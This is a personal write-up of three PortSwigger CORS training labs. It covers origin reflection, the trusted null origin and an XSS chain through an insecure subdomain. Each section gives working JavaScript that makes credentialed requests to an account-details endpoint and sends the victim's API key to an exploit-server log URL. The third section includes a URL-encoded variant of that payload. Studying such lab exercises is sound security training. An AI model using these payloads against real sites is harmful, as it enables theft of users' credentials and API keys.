# Encounters with CORS vulnerabilities

# CORS with basic origin reflection
Retrieve the Administrator API key
## Observations
- Can login but otherwise very basic site. 
- Once logged in I have access to an API key which is new. 
-- There is an /accountDetails request that gets my username, email, API key, and session tokens. 
- The response to the account details page contains a header "Access-Control-Allow-Origin" which probably means they're doing some CORS policies. 
- Usin the origin: http://evil.com it is reflected in the ACAO header. 
- Steal the API key with the following payload which creates a new AJAX request opening /account-Details via a GET and sends the credential (true). 
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a5c00ba04df5abb809e031600da00ee.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

# CORS vulnerability with trusted null origin
Get the API key. 
## Observations
- Login with an API key in the dashboard. 
- Another Account Details request.
- ```Origin: null``` works as the server responds with Access-Control-Allow-Origin: null.
- We can try to force a null origin by sandboxing the payload this time:
```
<iframe sandbox="allow-scripts" srcdoc="
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    // Exfiltrate via redirect
    location = 'https://exploit-0a66002b03953236802e161a012f005e.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
  };
  req.open('GET', 'https://0ab5009b03b732ec80df17b300210043.web-security-academy.net/accountDetails', true);
  req.withCredentials = true;
  req.send();
</script>
"></iframe>
```

# CORS vulnerability with trusted insecure protocols
Steal API key
## Observations
- Origin accepts http versions of the lab URL and subdomains variants of it. 
- You can check the stock on store items and it goes to a stock subdomain. 
- The product ID param is vulnerable to reflected XSS. 
- What we can do is URL encode the CORS AJAX payload from the first encounter above and put that as the XSS payload in the URL to the stock checking site. Then take that an put it in an script payload and deliver it to the victim. 
```
<script>
document.location="https://stock.0ab600bf047c49e680a5df2900f80093.web-security-academy.net/?productId=6%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%20%20%20%20%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%0a%20%20%20%20%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%30%61%62%36%30%30%62%66%30%34%37%63%34%39%65%36%38%30%61%35%64%66%32%39%30%30%66%38%30%30%39%33%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%20%20%20%20%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%20%20%20%20%72%65%71%2e%73%65%6e%64%28%29%3b%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%20%20%20%20%20%20%20%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%35%31%30%30%61%65%30%34%36%30%34%39%32%33%38%30%37%33%64%65%32%36%30%31%31%31%30%30%37%63%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%6c%6f%67%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1"
</script>
```
This works on me but doesn't work on the victim for some reason so I am going to decode it and see if that was the issue:
```
<script>
    document.location="http://stock.0ab600bf047c49e680a5df2900f80093.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ab600bf047c49e680a5df2900f80093.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a5100ae046049238073de260111007c.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
They're almost the same payload but the URL encoding seems to have thrown off the exploitation effectiveness when delivered to the victim. 




